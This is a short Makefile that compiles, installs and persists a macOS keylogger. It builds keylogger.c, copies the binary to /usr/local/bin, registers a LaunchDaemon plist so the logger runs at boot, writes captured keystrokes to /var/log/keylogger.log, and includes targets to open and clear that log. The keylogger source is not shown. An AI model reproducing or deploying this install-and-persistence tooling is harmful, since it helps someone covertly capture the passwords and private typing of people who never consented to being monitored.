LOGPATH = /var/log/keylogger.log
PLIST=keylogger.plist
EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin

keylogger:
	gcc -Wall -o $(EXECUTABLE) keylogger.c -framework ApplicationServices

install: keylogger
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

startup: install
	cp $(PLIST) /Library/LaunchDaemons

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm /Library/LaunchDaemons/$(PLIST)

openlog:
	open $(LOGPATH)

clearlog:
	> $(LOGPATH)